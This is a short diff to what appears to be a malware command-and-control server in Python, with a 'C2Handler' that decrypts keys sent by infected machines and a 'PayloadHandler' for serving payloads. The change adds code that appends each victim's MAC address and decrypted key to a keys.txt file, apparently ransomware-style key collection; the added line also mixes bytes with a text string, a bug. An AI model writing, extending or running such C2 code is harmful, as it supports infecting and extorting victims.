@@ -31,6 +31,8 @@ class C2Handler(socketserver.StreamRequestHandler):
         mac, key = decrypt_key(data, d, n)
         print(mac.hex())
         print(key.hex())
+        with open('keys.txt', mode = 'ab') as keyfile:
+            keyfile.write(mac + b': ' + key + "\n")
 
 class PayloadHandler(socketserver.StreamRequestHandler):
     def handle(self) -> None:
